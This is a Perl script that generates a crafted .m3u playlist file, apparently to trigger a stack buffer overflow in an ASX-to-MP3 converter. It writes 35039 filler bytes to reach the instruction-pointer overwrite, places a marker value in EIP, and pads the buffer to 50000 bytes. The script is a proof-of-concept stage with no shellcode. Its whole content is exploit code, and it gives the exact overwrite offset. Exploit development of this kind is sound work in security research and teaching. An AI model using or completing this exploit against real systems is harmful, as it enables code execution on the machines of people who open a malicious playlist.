#!/usr/bin/perl

my $buffsize = 50000; # sets buffer size for consistent sized payload

my $junk = "\x41" x 35039; # offset to eip overwrite
my $eip = "\x42" x 4; # overwrite eip
my $sploit = $junk.$eip; # build the exploit portion of the buffer
my $fill = "\x43" x ($buffsize - length($sploit)); # fill the remainder of the buffer
my $buffer = $sploit.$fill; # build the final buffer

# write the exploit buffer to file
my $file = "asx2mp3.m3u";
open(FILE, ">$file");
print FILE $buffer;
close(FILE);
print "Exploit file created [" . $file . "]\n";
print "Buffer size: " . length($buffer). "\n";
